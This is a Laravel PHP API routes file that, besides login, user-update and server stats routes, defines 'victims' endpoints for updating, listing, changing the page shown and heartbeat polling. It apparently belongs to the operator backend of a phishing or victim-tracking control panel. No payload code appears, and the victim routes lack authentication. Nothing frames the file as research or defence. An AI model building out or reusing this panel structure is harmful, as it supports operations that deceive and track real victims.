<?php

use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\Api\UserPanelController;
use App\Http\Controllers\Api\VictimController;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
    return $request->user();
});

Route::middleware(['cors'])->group(function () {
    Route::prefix('auth')->group(function () {
        Route::post('login', [AuthController::class, 'login'])->name('api.auth.login');
        Route::put('users/{id}', [AuthController::class, 'update'])->name('api.auth.update');
    });

    Route::get('/server/stats', [UserPanelController::class, 'stats'])->name('api.server.stats');
    Route::get('/server/data', [UserPanelController::class, 'data'])->name('api.server.data');
    Route::post('/server', [UserPanelController::class, 'update'])->name('api.server.update');

    Route::post('/victims', [VictimController::class, 'update'])->name('api.victims.update');
    Route::post('/victims/pages', [VictimController::class, 'changePage'])->name('api.victims.page');
    Route::get('/victims', [VictimController::class, 'get'])->name('api.victims.get');
    Route::get('/victims/heartbeat', [VictimController::class, 'heartbeat'])->name('api.victims.heartbeat');
});
